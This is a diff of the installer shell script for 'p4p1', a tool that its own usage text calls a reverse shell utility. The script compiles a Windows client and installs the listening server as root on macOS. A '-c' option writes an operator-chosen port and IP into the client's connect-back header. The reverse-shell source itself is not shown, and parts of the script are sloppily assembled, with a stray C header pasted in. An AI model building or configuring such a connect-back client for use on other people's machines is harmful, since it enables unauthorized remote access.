@@ -4,10 +4,140 @@
 #	it will make the client and install the server
 # Usage:
 #	./install	# you might have to chmod 755 it if it cannot run
+# Default.h template for the -c setting
+#ifndef _DEFAULT_H_
+#define _DEFAULT_H_
+
+#define DEFAULT_PORT 4441				// port to connect on
+#define DEFAULT_IP "127.0.0.1"				// ip to connect to
+#define DEFAULT_IP_SIZE (strlen(DEFAULT_IP) + 1)	// size of ip to allocate it later
+#define TEXT_FILE_OFF
+
+#if defined(TEXT_FILE_ON)
+
+	#define TEXT_CONTENT "This is a file on you're computaa!"
+	#define FILE_NAME "file.txt"
+
+#endif
+
+#endif
 
 SERVER_P4P1=server/main.py
+SERVER_P4P1_LIB=server/p4p1.pyc
 CLIENT_P4P1=p4p1.exe
+OS=$(uname)
 
-make all
-make clean
-chmod 755 $SERVER_P4P1
+function usage() {
+
+	printf "P4P1 - Installer usage:\n"
+	printf "\n"
+	printf "Descritpion: - What is p4p1\n"
+	printf "\tp4p1 is a reverse shell utility, it can be used for access control or just\n"
+	printf "\tsystem maintenance.\n"
+	printf "\n"
+	printf "Arguments: - installer arguments\n"
+	printf "\t-h -> show this message\n"
+	printf "\t-c -> customize the client [ for more infor see customisation bellow ]\n"
+	printf "\t-r -> remove the installed server on the current machine\n"
+	printf "\n"
+	printf "General: - what is this script\n"
+	printf "\tThis script is the installer script for p4p1, it will help you with the compilation\n"
+	printf "\tand installing the server.\n"
+
+	exit $1
+
+}
+
+function build_p4p1() {
+
+	make all
+	make clean
+
+}
+
+function install_p4p1() {
+
+	OS_X_LIB=/Library/Python/2.7/site-packages/
+	if [[ "$UID" -ne "0" ]]; then
+		printf "\e[;31m[!] You are not running the program as root how am i supposed to install anything?\n\e[;0m"
+		exit -1
+	fi
+	if [[ "$OS" = "Darwin" ]]; then
+		mkdir $OS_X_LIB/p4p1
+		cp $SERVER_P4P1_LIB /usr/local/bin/ 
+	fi
+	chmod 755 $SERVER_P4P1
+	if [[ "$OS" = "Darwin" ]]; then
+		mv $SERVER_P4P1 /usr/local/bin/p4p1
+	fi
+
+
+}
+
+function update_client() {
+
+	FILE_TO_UPDATE=client/default.h
+	: > $FILE_TO_UPDATE
+	printf "#ifndef _DEFAULT_H_\n" >> $FILE_TO_UPDATE
+	printf "#define _DEFAULT_H_\n\n" >> $FILE_TO_UPDATE
+	printf "#define DEFAULT_PORT $1 // port to connect to\n" >> $FILE_TO_UPDATE
+	printf "#define DEFAULT_IP \"$2\"				// ip to connect to" >> $FILE_TO_UPDATE
+	printf "#define DEFAULT_IP_SIZE (strlen(DEFAULT_IP) + 1)	// size of ip to allocate it later\n" >> $FILE_TO_UPDATE
+	printf "#define TEXT_FILE_OFF\n\n" >> $FILE_TO_UPDATE
+
+	printf "#if defined(TEXT_FILE_ON)\n" >> $FILE_TO_UPDATE
+
+	printf "\t#define TEXT_CONTENT \"STUFF IN FILE\"\n" >> $FILE_TO_UPDATE
+	printf "\t#define FILE_NAME \"NAME_O_FILE.TXT\"\n" >> $FILE_TO_UPDATE
+	printf "#endif\n" >> $FILE_TO_UPDATE
+	printf "#endif\n" >> $FILE_TO_UPDATE
+
+}
+
+if [[ "$OS" = "Darwin" ]]; then
+
+	if [[ ! -f "/usr/local/bin/i686-w64-mingw32-gcc" ]]; then	
+		printf "\e[;31m[!] You have not installed i686-w64-mingw32-gcc compiler,\n"
+		printf "[!] Please install it to make this script work!\e[;0m\n"
+		printf "\e[;32m[*] Note:\n"
+		printf "[*]\tUse this repository for brew, more explications on github [ see link ]\n"
+		printf "[*]\thttps://github.com/cosmo0920/homebrew-mingw_w64\n"
+		printf "[*]\tI did not make this all creditsto cosmo0920\n\e[;0m"
+		exit -1
+	fi
+
+fi
+
+if [ -z "$*" ]; then
+
+	build_p4p1
+	install_p4p1
+
+else
+
+		if [[ "$1" = "-r" ]]; then
+
+			if [[ "$OS" = "Darwin" ]]; then
+
+				rm -rf /usr/local/bin/p4p1.pyc
+				rm -rf /usr/local/bin/p4p1
+				printf "\e[;32m[*] Removed p4p1.\n\e[;0m"
+
+			fi
+
+		elif [[ "$1" = "-c" ]]; then
+		
+			printf "[*] You are now editing the p4p1 client, enter the port then the ip\n\e[;0m"
+			printf "\e[;31m[$] PORT :> \e[;0m"
+			read PORT
+			printf "\e[;31m[$] IP :> \e[;0m"
+			read IP
+			update_client $PORT $IP
+			build_p4p1
+
+		else
+
+			usage 1
+
+	fi
+fi
